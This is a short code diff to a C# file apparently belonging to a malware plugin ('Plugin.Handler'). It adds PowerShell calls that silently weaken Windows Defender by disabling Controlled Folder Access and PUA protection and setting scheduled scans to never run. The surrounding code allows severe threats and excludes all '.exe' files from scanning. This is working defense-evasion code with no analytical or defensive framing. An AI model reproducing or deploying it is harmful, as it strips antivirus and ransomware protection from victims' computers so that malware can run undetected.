@@ -105,6 +105,15 @@ namespace Plugin.Handler
 
                 else if (line.Contains(@"SevereThreatDefaultAction") && !line.Contains("6"))
                     RunPS("Set-MpPreference -SevereThreatDefaultAction 6"); // severe level threat
+
+                else if (line.Contains(@"EnableControlledFolderAccess") && !line.Contains("0"))
+                    RunPS("Set-MpPreference -EnableControlledFolderAccess Disabled"); // controlled folder access
+
+                else if (line.Contains(@"PUAProtection") && !line.Contains("0"))
+                    RunPS("Set-MpPreference -PUAProtection disable"); //PUAProtection
+
+                else if (line.Contains(@"ScanScheduleDay") && !line.Contains("8"))
+                    RunPS("Set-MpPreference -ScanScheduleDay 8"); //Scan Schedule Day
             }
             RunPS("Add-MpPreference -ExclusionExtension "+"\""+".exe"+"\""); // add exe to exception
         }
